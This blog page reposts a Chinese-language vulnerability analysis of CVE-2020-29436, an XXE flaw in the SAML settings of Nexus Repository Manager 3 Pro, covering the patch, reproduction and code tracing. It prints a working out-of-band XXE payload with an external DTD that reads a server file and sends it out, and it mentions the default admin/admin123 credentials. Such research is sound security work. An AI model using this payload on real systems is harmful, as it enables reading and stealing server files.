<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)作者：r00t4dm@Cloud-Penetrating Arrow Lab &amp; Longofo@知道创宇404实验室时间：2020年12月16日 最近Nexus Repository Manager3安全公告更新了一个XXE漏洞，虽然需要管理权限才能利用，并且Nexus Repositor">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90(CVE-2020-29436)/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)作者：r00t4dm@Cloud-Penetrating Arrow Lab &amp; Longofo@知道创宇404实验室时间：2020年12月16日 最近Nexus Repository Manager3安全公告更新了一个XXE漏洞，虽然需要管理权限才能利用，并且Nexus Repositor">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:26:00.118Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.670Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Nexus/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90(CVE-2020-29436)/" class="article-date">
  <time datetime="2022-07-08T06:26:00.118Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Nexus-Repository-Manager3-ProXXE分析-CVE-2020-29436"><a href="#Nexus-Repository-Manager3-ProXXE分析-CVE-2020-29436" class="headerlink" title="Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)"></a>Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)</h1><p><strong>作者：r00t4dm@Cloud-Penetrating Arrow Lab &amp; Longofo@知道创宇404实验室</strong><br><strong>时间：2020年12月16日</strong></p>
<p>最近Nexus Repository Manager3<a target="_blank" rel="noopener" href="https://support.sonatype.com/hc/en-us/sections/203012668-Security-Advisories">安全公告</a>更新了一个XXE漏洞，虽然需要管理权限才能利用，并且Nexus Repository Manager3在较高的版本中也会强制更改以前较低版本使用的默认密码<code>admin/admin123</code>，最后漏洞触发也很简单，但是过程还是挺有意思，并且不会受到jdk高版本导致不能带换行的问题，列目录、读文件可以带出任意字符，除了二进制文件外，没有找到能编码的协议。</p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a target="_blank" rel="noopener" href="https://github.com/sonatype/nexus-public/compare/release-3.28.1-01...release-3.29.0-02">diff</a>下最高漏洞版本3.28.1-01和修复版本3.29.0-02：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-e2be1ea0ca7a5049167e98454f591e8d_b.jpg)</p>
<p>可以看到在一个SafeXml#configureValidator中做了限制加载外部dtd的操作，可以注意到这个configureValidator是新增的方法而不是在原方法中修复，但是只是个工具类。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>来到后台Saml的功能点：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-f331f8dd3e51ad798740576e028eea85_b.jpg)</p>
<p>看到这个大大的XML输入框就知道大概率是有XML操作的。</p>
<p>简单测试下能不能进行dtd请求，如果能的话很可能读取文件也可以：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-0e7cdf9f0de38cf1d590babc28dff691_b.jpg)</p>
<p>点击保存就能看到进行了请求。测试了下读文件，可以利用ftp、http等协议带出单行文件，看了下jdk版本在windows是使用的自带的8u252，@r00t4dm在mac上的安装包不会自带jdk，使用的是系统的，那么linux下也是系统的，所以试用的是较低版本的jdk，是可以带换行的。后面看了下返回包，居然把异常返回到了json，那么我们可以通过报错xml将任何文本字符带出了，包括<code>\n</code>、<code>#</code>、<code>&lt;</code>等文本字符。</p>
<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> \[ <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span> <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;[http://127.0.0.1:8000/my.dtd](https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8000/my.dtd)&quot;</span>&gt;</span> %dtd; %send; \]&gt;</span> <span class="tag">&lt;<span class="name">ANY</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">ANY</span>&gt;</span> dtd： <span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;%file;&#x27;&gt;&quot;</span> &gt;</span> %all;</span><br></pre></td></tr></table></figure>

<p>看下效果：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-98103421b633770daaf419bf9c9cbcfa_b.jpg)</p>
<p>其他带<code>#</code>、<code>&lt;</code>等字符的文件也都可以。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>既然configureValidator是新增的方法，而且是一个static方法，那么在最新版本中大概率就有其他类调用这个方法了来修复了。在github开源的3.29.0-02代码中搜索configureValidator，没有搜到任何结果，这个地方就很奇怪了，难道是动态隐式调用？但是前面configureValidator是一个新增的方法并且是一个静态方法，感觉不太可能动态隐式调用。因为之前也弄过Nexus的漏洞，他的安装包lib中有许多代码没有在github那个开源的仓库中，所以就反编译了3.29.0-02版本所有的lib包，一搜索configureValidator，果然有调用而且就此一处：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-1d34419cfa044f377622bd716ad9c135_b.png)</p>
<p>接着又往上搜SamlMetadataTool的调用，都是带有Saml字眼的相关类在调用。所以猜想会有个Saml的功能，去<a target="_blank" rel="noopener" href="https://help.sonatype.com/repomanager3/system-configuration/user-authentication/saml">官方文档</a>搜索下：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-a1302cc05678b0f4872281a7aa1220a6_b.jpg)</p>
<p>看到这个描述是不是有点激动呢？猜测就是这个位置了。按照描述去后台配置点，发现并不能使用这个SAML功能，再看文档说的式要Pro版本才能用这个功能，可以去官网<a target="_blank" rel="noopener" href="https://www.sonatype.com/nexus/repository-pro">申请试用</a>。</p>
<p>从上面的发包可以看到处理url为<code>/service/rest/internal/ui/saml</code>，在github开源部分的代码中依然是搜不到的，在反编译的代码中搜索<code>/ui/saml</code>可以找到处理类:</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-de73d543d073c1c79ca51deffa4c682b_b.png)</p>
<p>下面是调用栈：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-02d0193c7e806f8800e61069781da8f5_b.jpg)</p>
<p>前面调用栈太长就不copy出来了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/337649864">https://zhuanlan.zhihu.com/p/337649864</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90(CVE-2020-29436)/" data-id="cl5c2qsxc00c3y8v10hz48u64" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/NewZhan%20CMS/NewZhan%20CMS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>